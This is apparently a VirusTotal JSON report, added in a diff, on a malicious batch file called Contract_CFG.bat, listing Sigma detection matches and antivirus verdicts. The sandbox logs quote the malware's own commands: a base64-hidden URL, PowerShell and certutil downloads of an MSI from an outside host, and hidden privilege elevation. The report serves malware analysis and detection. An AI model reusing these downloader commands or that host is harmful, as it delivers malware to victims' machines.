@@ -1,0 +1,980 @@
+{
+  "data": {
+    "id": "061dcfa6268c7407f7bffc6c2cc3208d54fa5aa71a0b2cd96737bb62e92a6397",
+    "type": "file",
+    "links": {
+      "self": "https://www.virustotal.com/api/v3/files/061dcfa6268c7407f7bffc6c2cc3208d54fa5aa71a0b2cd96737bb62e92a6397"
+    },
+    "attributes": {
+      "size": 1203,
+      "filecondis": {
+        "raw_md5": "d9a3f609358e7004a941c3e9b1e43bc8",
+        "dhash": "fcfaeaaec4b28a80"
+      },
+      "last_modification_date": 1794254943,
+      "last_analysis_date": 1794247374,
+      "unique_sources": 1,
+      "reputation": -11,
+      "type_tag": "bat",
+      "times_submitted": 1,
+      "magika": "BATCH",
+      "last_submission_date": 1794229788,
+      "sigma_analysis_stats": {
+        "critical": 0,
+        "high": 1,
+        "medium": 5,
+        "low": 1
+      },
+      "tlsh": "T1E321440B341FAD0949774AC245FA3281976F93930721E3D5B2D8DD18790E3A2D299DDC",
+      "magic": "DOS batch file, ASCII text, with CRLF line terminators",
+      "sha1": "ab2a0ba738b044adaac02dc91af436f72748a6ea",
+      "names": [
+        "xqsiegtaf.exe",
+        "574hzs6.exe",
+        "Contract_CFG.bat"
+      ],
+      "type_description": "DOS batch file",
+      "md5": "91e96b9d84da0f34d3f69aec79e18a38",
+      "meaningful_name": "xqsiegtaf.exe",
+      "total_votes": {
+        "harmless": 0,
+        "malicious": 1
+      },
+      "ssdeep": "24:wq1l9UDC9p4IMceEE7U9yHIrq9GaLw1PKC2SO9KmG1jkSak7yAbd34/+YqaLDU:9l9UDqCfUS9GL1P3r+G1jkSak7yAbw+H",
+      "sha256": "061dcfa6268c7407f7bffc6c2cc3208d54fa5aa71a0b2cd96737bb62e92a6397",
+      "type_extension": "bat",
+      "tags": [
+        "bat",
+        "detect-debug-environment",
+        "calls-wmi",
+        "macro-powershell",
+        "obfuscated"
+      ],
+      "popular_threat_classification": {
+        "popular_threat_name": [
+          {
+            "count": 10,
+            "value": "pwsh"
+          },
+          {
+            "count": 1,
+            "value": "batch"
+          },
+          {
+            "count": 1,
+            "value": "daxpiqykrp"
+          }
+        ],
+        "popular_threat_category": [
+          {
+            "count": 13,
+            "value": "downloader"
+          },
+          {
+            "count": 9,
+            "value": "trojan"
+          }
+        ],
+        "suggested_threat_label": "downloader.pwsh/batch"
+      },
+      "sigma_analysis_results": [
+        {
+          "rule_level": "high",
+          "rule_id": "e75e9983c2277304aa1294c0b077a3139a8405cd1661ccf513a6c05a002acacf",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "Base64 Encoded PowerShell Command Detected",
+          "rule_description": "Detects usage of the \"FromBase64String\" function in the commandline which is used to decode a base64 encoded string",
+          "rule_author": "Florian Roth (Nextron Systems)",
+          "match_context": [
+            {
+              "values": {
+                "Hashes": "SHA1=4048488DE6BA4BFEF9EDF103755519F1F762668F,MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A",
+                "CurrentDirectory": "C:\\Windows\\system32\\",
+                "OriginalFileName": "Cmd.Exe",
+                "Product": "Microsoft\\xae Windows\\xae Operating System",
+                "Description": "Windows Command Processor",
+                "FileVersion": "10.0.19041.746 (WinBuild.160101.0800)",
+                "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\Bruno\\Desktop\\Contract_CFG.bat\"  h",
+                "CommandLine": "C:\\Windows\\system32\\cmd.exe /c powershell -NoProfile -WindowStyle Hidden -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hdWR0Zm5hdXJ0aC5jb20uZXMvZmlsZS9uYnYubXNp'))\"",
+                "EventID": "1",
+                "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
+                "IntegrityLevel": "High",
+                "Image": "C:\\Windows\\SysWOW64\\cmd.exe",
+                "Company": "Microsoft Corporation"
+              }
+            },
+            {
+              "values": {
+                "Product": "Microsoft\\xae Windows\\xae Operating System",
+                "CurrentDirectory": "C:\\Windows\\system32\\",
+                "OriginalFileName": "PowerShell.EXE",
+                "Hashes": "SHA1=F5EE89BB1E4A0B1C3C7F1E8D05D0677F2B2B5919,MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667",
+                "Description": "Windows PowerShell",
+                "EventID": "1",
+                "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c powershell -NoProfile -WindowStyle Hidden -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hdWR0Zm5hdXJ0aC5jb20uZXMvZmlsZS9uYnYubXNp'))\"",
+                "CommandLine": "powershell  -NoProfile -WindowStyle Hidden -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hdWR0Zm5hdXJ0aC5jb20uZXMvZmlsZS9uYnYubXNp'))\"",
+                "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+                "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
+                "IntegrityLevel": "High",
+                "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "Company": "Microsoft Corporation"
+              }
+            },
+            {
+              "values": {
+                "Hashes": "SHA1=13E9BB7E85FF9B08C26A440412E5CD5D296C4D35,MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",
+                "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                "OriginalFileName": "Cmd.Exe",
+                "Product": "Microsoft\\xae Windows\\xae Operating System",
+                "Description": "Windows Command Processor",
+                "EventID": "1",
+                "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\Bruno\\Desktop\\Contract_CFG.bat\"  h",
+                "CommandLine": "C:\\Windows\\system32\\cmd.exe /c powershell -NoProfile -WindowStyle Hidden -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hdWR0Zm5hdXJ0aC5jb20uZXMvZmlsZS9uYnYubXNp'))\"",
+                "FileVersion": "10.0.22621.1635 (WinBuild.160101.0800)",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "IntegrityLevel": "High",
+                "Image": "C:\\Windows\\System32\\cmd.exe",
+                "Company": "Microsoft Corporation"
+              }
+            },
+            {
+              "values": {
+                "Hashes": "SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",
+                "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                "OriginalFileName": "PowerShell.EXE",
+                "Product": "Microsoft\\xae Windows\\xae Operating System",
+                "Description": "Windows PowerShell",
+                "FileVersion": "10.0.22621.2361 (WinBuild.160101.0800)",
+                "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c powershell -NoProfile -WindowStyle Hidden -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hdWR0Zm5hdXJ0aC5jb20uZXMvZmlsZS9uYnYubXNp'))\"",
+                "CommandLine": "powershell  -NoProfile -WindowStyle Hidden -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hdWR0Zm5hdXJ0aC5jb20uZXMvZmlsZS9uYnYubXNp'))\"",
+                "EventID": "1",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "IntegrityLevel": "High",
+                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "Company": "Microsoft Corporation"
+              }
+            }
+          ]
+        },
+        {
+          "rule_level": "medium",
+          "rule_id": "124bf07ac70743e91b5698e3731aae0330fc182aa58036390f2a0457a90b5341",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "Suspicious PowerShell Download - Powershell Script",
+          "rule_description": "Detects suspicious PowerShell download command",
+          "rule_author": "Florian Roth (Nextron Systems)",
+          "match_context": [
+            {
+              "values": {
+                "ScriptBlockText": "(New-Object System.Net.WebClient).DownloadFile('https://audtfnaurth.com.es/file/nbv.msi', 'C:\\Users\\Bruno\\AppData\\Local\\Temp\\sc_3249.msi')",
+                "MessageTotal": "1",
+                "ScriptBlockId": "dc235782-6ade-45d0-8ebf-0868abc60d57",
+                "Path": "",
+                "MessageNumber": "1",
+                "EventID": "4104"
+              }
+            }
+          ]
+        },
+        {
+          "rule_level": "medium",
+          "rule_id": "24c9049c81b149aa4537cce166e36f3697878dcdad3fab8b662889d154056d7c",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "PowerShell Download Pattern",
+          "rule_description": "Detects a Powershell process that contains download commands in its command line string",
+          "rule_author": "Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro",
+          "match_context": [
+            {
+              "values": {
+                "Hashes": "SHA1=F5EE89BB1E4A0B1C3C7F1E8D05D0677F2B2B5919,MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667",
+                "CurrentDirectory": "C:\\Windows\\system32\\",
+                "OriginalFileName": "PowerShell.EXE",
+                "Product": "Microsoft\\xae Windows\\xae Operating System",
+                "Description": "Windows PowerShell",
+                "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+                "EventID": "1",
+                "CommandLine": "powershell  -WindowStyle Hidden -Command \"(New-Object System.Net.WebClient).DownloadFile('https://audtfnaurth.com.es/file/nbv.msi', 'C:\\Users\\Bruno\\AppData\\Local\\Temp\\sc_3249.msi')\" ",
+                "IntegrityLevel": "High",
+                "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "Company": "Microsoft Corporation"
+              }
+            }
+          ]
+        },
+        {
+          "rule_level": "medium",
+          "rule_id": "58420e39c1212a7677f357957516cbc90081f03f0eff5a93e3fa8476eefebfcf",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "Suspicious Download Via Certutil.EXE",
+          "rule_description": "Detects the execution of certutil with certain flags that allow the utility to download files.",
+          "rule_author": "Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
+          "match_context": [
+            {
+              "values": {
+                "Hashes": "SHA1=2085D81175AEF2537D4B4E8DCD641585951DADEE,MD5=2EE61062AF648FF954408D422CA408F4,SHA256=1C010BFBF42A6A32EC9BFF5A3A559B51C983D77CE47D30074AA170417FA4CF1D,IMPHASH=92EAFDFBCF8B4ECD46E832973B0649D6",
+                "CurrentDirectory": "C:\\Windows\\system32\\",
+                "OriginalFileName": "CertUtil.exe",
+                "Product": "Microsoft\\xae Windows\\xae Operating System",
+                "Description": "CertUtil.exe",
+                "FileVersion": "10.0.19041.1 (WinBuild.160101.0800)",
+                "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\Bruno\\Desktop\\Contract_CFG.bat\"  h",
+                "CommandLine": "certutil  -urlcache -split -f \"https://audtfnaurth.com.es/file/nbv.msi\" \"C:\\Users\\Bruno\\AppData\\Local\\Temp\\sc_3249.msi\" ",
+                "EventID": "1",
+                "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
+                "IntegrityLevel": "High",
+                "Image": "C:\\Windows\\SysWOW64\\certutil.exe",
+                "Company": "Microsoft Corporation"
+              }
+            }
+          ]
+        },
+        {
+          "rule_level": "medium",
+          "rule_id": "96d2c399118cab5d249093badf4a85f0ef1889872b0191bdf131bcabc0994681",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "Potentially Suspicious Powershell Script Execution From Temp Folder",
+          "rule_description": "Detects a potentially suspicious powershell script executions from temporary folder",
+          "rule_author": "Florian Roth (Nextron Systems), Max Altgelt (Nextron Systems), Tim Shelton",
+          "match_context": [
+            {
+              "values": {
+                "Product": "Microsoft\\xae Windows\\xae Operating System",
+                "CurrentDirectory": "C:\\Windows\\system32\\",
+                "OriginalFileName": "PowerShell.EXE",
+                "Hashes": "SHA1=F5EE89BB1E4A0B1C3C7F1E8D05D0677F2B2B5919,MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667",
+                "Description": "Windows PowerShell",
+                "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+                "EventID": "1",
+                "CommandLine": "powershell  -WindowStyle Hidden -Command \"(New-Object System.Net.WebClient).DownloadFile('https://audtfnaurth.com.es/file/nbv.msi', 'C:\\Users\\Bruno\\AppData\\Local\\Temp\\sc_3249.msi')\" ",
+                "IntegrityLevel": "High",
+                "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "Company": "Microsoft Corporation"
+              }
+            }
+          ]
+        },
+        {
+          "rule_level": "medium",
+          "rule_id": "ece68c3b6fda1fe5c7d8707c5dd9099cf564ed0e7e7b480e97278c475f10e5a7",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "Powershell Execute Batch Script",
+          "rule_description": "Adversaries may abuse the Windows command shell for execution.\nThe Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems.\nThe Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands.\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops.\nCommon uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple system\n",
+          "rule_author": "frack113",
+          "match_context": [
+            {
+              "values": {
+                "ScriptBlockText": "Start-Process 'C:\\Users\\Bruno\\Desktop\\Contract_CFG.bat' -Verb RunAs -WindowStyle Hidden",
+                "MessageTotal": "1",
+                "ScriptBlockId": "be11fe93-3e2b-4387-acf2-b231e77b14b1",
+                "Path": "",
+                "EventID": "4104",
+                "MessageNumber": "1"
+              }
+            }
+          ]
+        },
+        {
+          "rule_level": "low",
+          "rule_id": "1c2e4db94ca79f939e94e29c04fb3b71467fc6f5b9c31db34fcce5a2fb3b856f",
+          "rule_source": "Sigma Integrated Rule Set (GitHub)",
+          "rule_title": "Non Interactive PowerShell Process Spawned",
+          "rule_description": "Detects non-interactive PowerShell activity by looking at the \"powershell\" process with a non-user GUI process such as \"explorer.exe\" as a parent.",
+          "rule_author": "Roberto Rodriguez @Cyb3rWard0g (rule), oscd.community (improvements)",
+          "match_context": [
+            {
+              "values": {
+                "Product": "Microsoft\\xae Windows\\xae Operating System",
+                "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                "OriginalFileName": "PowerShell.EXE",
+                "Hashes": "SHA1=F5EE89BB1E4A0B1C3C7F1E8D05D0677F2B2B5919,MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667",
+                "Description": "Windows PowerShell",
+                "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+                "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\Bruno\\Desktop\\Contract_CFG.bat\"",
+                "CommandLine": "powershell  -WindowStyle Hidden -Command \"Start-Process 'C:\\Users\\Bruno\\Desktop\\Contract_CFG.bat' -Verb RunAs -WindowStyle Hidden\" ",
+                "EventID": "1",
+                "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
+                "IntegrityLevel": "Medium",
+                "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "Company": "Microsoft Corporation"
+              }
+            },
+            {
+              "values": {
+                "Product": "Microsoft\\xae Windows\\xae Operating System",
+                "CurrentDirectory": "C:\\Windows\\system32\\",
+                "OriginalFileName": "PowerShell.EXE",
+                "Hashes": "SHA1=F5EE89BB1E4A0B1C3C7F1E8D05D0677F2B2B5919,MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667",
+                "Description": "Windows PowerShell",
+                "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+                "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c powershell -NoProfile -WindowStyle Hidden -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hdWR0Zm5hdXJ0aC5jb20uZXMvZmlsZS9uYnYubXNp'))\"",
+                "CommandLine": "powershell  -NoProfile -WindowStyle Hidden -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hdWR0Zm5hdXJ0aC5jb20uZXMvZmlsZS9uYnYubXNp'))\"",
+                "EventID": "1",
+                "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
+                "IntegrityLevel": "High",
+                "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "Company": "Microsoft Corporation"
+              }
+            },
+            {
+              "values": {
+                "Hashes": "SHA1=F5EE89BB1E4A0B1C3C7F1E8D05D0677F2B2B5919,MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667",
+                "CurrentDirectory": "C:\\Windows\\system32\\",
+                "OriginalFileName": "PowerShell.EXE",
+                "Product": "Microsoft\\xae Windows\\xae Operating System",
+                "Description": "Windows PowerShell",
+                "EventID": "1",
+                "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+                "CommandLine": "powershell  -WindowStyle Hidden -Command \"(New-Object System.Net.WebClient).DownloadFile('https://audtfnaurth.com.es/file/nbv.msi', 'C:\\Users\\Bruno\\AppData\\Local\\Temp\\sc_3249.msi')\" ",
+                "IntegrityLevel": "High",
+                "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "Company": "Microsoft Corporation"
+              }
+            },
+            {
+              "values": {
+                "Hashes": "SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",
+                "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                "OriginalFileName": "PowerShell.EXE",
+                "Product": "Microsoft\\xae Windows\\xae Operating System",
+                "Description": "Windows PowerShell",
+                "EventID": "1",
+                "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c powershell -NoProfile -WindowStyle Hidden -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hdWR0Zm5hdXJ0aC5jb20uZXMvZmlsZS9uYnYubXNp'))\"",
+                "CommandLine": "powershell  -NoProfile -WindowStyle Hidden -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hdWR0Zm5hdXJ0aC5jb20uZXMvZmlsZS9uYnYubXNp'))\"",
+                "FileVersion": "10.0.22621.2361 (WinBuild.160101.0800)",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "IntegrityLevel": "High",
+                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "Company": "Microsoft Corporation"
+              }
+            }
+          ]
+        }
+      ],
+      "last_analysis_results": {
+        "Bkav": {
+          "method": "blacklist",
+          "engine_name": "Bkav",
+          "engine_version": "8.2.40(8338)",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Lionic": {
+          "method": "blacklist",
+          "engine_name": "Lionic",
+          "engine_version": "8.16",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Trojan.Script.Agent.4!c"
+        },
+        "Cynet": {
+          "method": "blacklist",
+          "engine_name": "Cynet",
+          "engine_version": "4.0.3.4",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "CTX": {
+          "method": "blacklist",
+          "engine_name": "CTX",
+          "engine_version": "2026.10.27.1",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "script.downloader.pwsh"
+        },
+        "CAT-QuickHeal": {
+          "method": "blacklist",
+          "engine_name": "CAT-QuickHeal",
+          "engine_version": "22.00",
+          "engine_update": "20261108",
+          "category": "undetected",
+          "result": null
+        },
+        "ALYac": {
+          "method": "blacklist",
+          "engine_name": "ALYac",
+          "engine_version": "2.0.0.10",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Generic.PWSH.Downloader.D.C741B0FD"
+        },
+        "Malwarebytes": {
+          "method": "blacklist",
+          "engine_name": "Malwarebytes",
+          "engine_version": "3.1.0.296",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Sangfor": {
+          "method": "blacklist",
+          "engine_name": "Sangfor",
+          "engine_version": "2.22.3.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "K7AntiVirus": {
+          "method": "blacklist",
+          "engine_name": "K7AntiVirus",
+          "engine_version": "14.91.61413",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "K7GW": {
+          "method": "blacklist",
+          "engine_name": "K7GW",
+          "engine_version": "14.91.61415",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "CrowdStrike": {
+          "method": "blacklist",
+          "engine_name": "CrowdStrike",
+          "engine_version": "1.0",
+          "engine_update": "20251219",
+          "category": "undetected",
+          "result": null
+        },
+        "Arcabit": {
+          "method": "blacklist",
+          "engine_name": "Arcabit",
+          "engine_version": "2025.0.0.23",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Generic.PWSH.Downloader.D.C741B0FD"
+        },
+        "VirIT": {
+          "method": "blacklist",
+          "engine_name": "VirIT",
+          "engine_version": "9.5.1335",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Symantec": {
+          "method": "blacklist",
+          "engine_name": "Symantec",
+          "engine_version": "1.22.0.0",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Trojan.Pwsh!ATN"
+        },
+        "ESET-NOD32": {
+          "method": "blacklist",
+          "engine_name": "ESET-NOD32",
+          "engine_version": "18.2.18.0",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "PowerShell/TrojanDownloader.Agent.SUC trojan"
+        },
+        "TrendMicro-HouseCall": {
+          "method": "blacklist",
+          "engine_name": "TrendMicro-HouseCall",
+          "engine_version": "24.550.0.1002",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "TROJ_GEN.F0D1C00JK26"
+        },
+        "ClamAV": {
+          "method": "blacklist",
+          "engine_name": "ClamAV",
+          "engine_version": "1.5.4.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "BitDefender": {
+          "method": "blacklist",
+          "engine_name": "BitDefender",
+          "engine_version": "7.2",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Generic.PWSH.Downloader.D.C741B0FD"
+        },
+        "NANO-Antivirus": {
+          "method": "blacklist",
+          "engine_name": "NANO-Antivirus",
+          "engine_version": "1.0.170.26895",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Trojan.Script.Downloader.lbrsuf"
+        },
+        "ViRobot": {
+          "method": "blacklist",
+          "engine_name": "ViRobot",
+          "engine_version": "2026-11-09.03",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "MicroWorld-eScan": {
+          "method": "blacklist",
+          "engine_name": "MicroWorld-eScan",
+          "engine_version": "14.0.409.0",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Generic.PWSH.Downloader.D.C741B0FD"
+        },
+        "Rising": {
+          "method": "blacklist",
+          "engine_name": "Rising",
+          "engine_version": "25.0.0.28",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Sophos": {
+          "method": "blacklist",
+          "engine_name": "Sophos",
+          "engine_version": "3.7.2.1",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "F-Secure": {
+          "method": "blacklist",
+          "engine_name": "F-Secure",
+          "engine_version": "18.10.1547.307",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "DrWeb": {
+          "method": "blacklist",
+          "engine_name": "DrWeb",
+          "engine_version": "7.0.76.8280",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "VIPRE": {
+          "method": "blacklist",
+          "engine_name": "VIPRE",
+          "engine_version": "6.0.0.35",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Generic.PWSH.Downloader.D.C741B0FD"
+        },
+        "McAfeeD": {
+          "method": "blacklist",
+          "engine_name": "McAfeeD",
+          "engine_version": "1.2.0.16534",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "ti!061DCFA6268C"
+        },
+        "CMC": {
+          "method": "blacklist",
+          "engine_name": "CMC",
+          "engine_version": "2.4.2022.1",
+          "engine_update": "20261108",
+          "category": "undetected",
+          "result": null
+        },
+        "Emsisoft": {
+          "method": "blacklist",
+          "engine_name": "Emsisoft",
+          "engine_version": "2024.8.0.61147",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Generic.PWSH.Downloader.D.C741B0FD (B)"
+        },
+        "Ikarus": {
+          "method": "blacklist",
+          "engine_name": "Ikarus",
+          "engine_version": "6.5.4.0",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Trojan-Downloader.Batch"
+        },
+        "Jiangmin": {
+          "method": "blacklist",
+          "engine_name": "Jiangmin",
+          "engine_version": "16.0.100",
+          "engine_update": "20261108",
+          "category": "undetected",
+          "result": null
+        },
+        "Avira": {
+          "method": "blacklist",
+          "engine_name": "Avira",
+          "engine_version": "8.3.3.24",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Antiy-AVL": {
+          "method": "blacklist",
+          "engine_name": "Antiy-AVL",
+          "engine_version": "3.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Kingsoft": {
+          "method": "blacklist",
+          "engine_name": "Kingsoft",
+          "engine_version": "None",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Gridinsoft": {
+          "method": "blacklist",
+          "engine_name": "Gridinsoft",
+          "engine_version": "1.0.262.174",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Xcitium": {
+          "method": "blacklist",
+          "engine_name": "Xcitium",
+          "engine_version": "39100",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Microsoft": {
+          "method": "blacklist",
+          "engine_name": "Microsoft",
+          "engine_version": "1.26100",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Trojan:Script/Wacatac.B!ml"
+        },
+        "SUPERAntiSpyware": {
+          "method": "blacklist",
+          "engine_name": "SUPERAntiSpyware",
+          "engine_version": "5.6.0.1032",
+          "engine_update": "20261107",
+          "category": "undetected",
+          "result": null
+        },
+        "ZoneAlarm": {
+          "method": "blacklist",
+          "engine_name": "ZoneAlarm",
+          "engine_version": "6.28-119762367",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "GData": {
+          "method": "blacklist",
+          "engine_name": "GData",
+          "engine_version": "GD:27.46657AVA:64.32204",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Generic.PWSH.Downloader.D.C741B0FD"
+        },
+        "Google": {
+          "method": "blacklist",
+          "engine_name": "Google",
+          "engine_version": "1794243671",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Detected"
+        },
+        "AhnLab-V3": {
+          "method": "blacklist",
+          "engine_name": "AhnLab-V3",
+          "engine_version": "3.30.3.10716",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Acronis": {
+          "method": "blacklist",
+          "engine_name": "Acronis",
+          "engine_version": "1.2.0.121",
+          "engine_update": "20240328",
+          "category": "undetected",
+          "result": null
+        },
+        "VBA32": {
+          "method": "blacklist",
+          "engine_name": "VBA32",
+          "engine_version": "5.7.1",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "TACHYON": {
+          "method": "blacklist",
+          "engine_name": "TACHYON",
+          "engine_version": "2026-11-09.02",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Zoner": {
+          "method": "blacklist",
+          "engine_name": "Zoner",
+          "engine_version": "2.2.2.0",
+          "engine_update": "20261109",
+          "category": "undetected",
+          "result": null
+        },
+        "Tencent": {
+          "method": "blacklist",
+          "engine_name": "Tencent",
+          "engine_version": "1.0.0.1",
+          "engine_update": "20261109",
+          "category": "malicious",
+          "result": "Bat.Trojan.Agent.Qzfl"
+        },
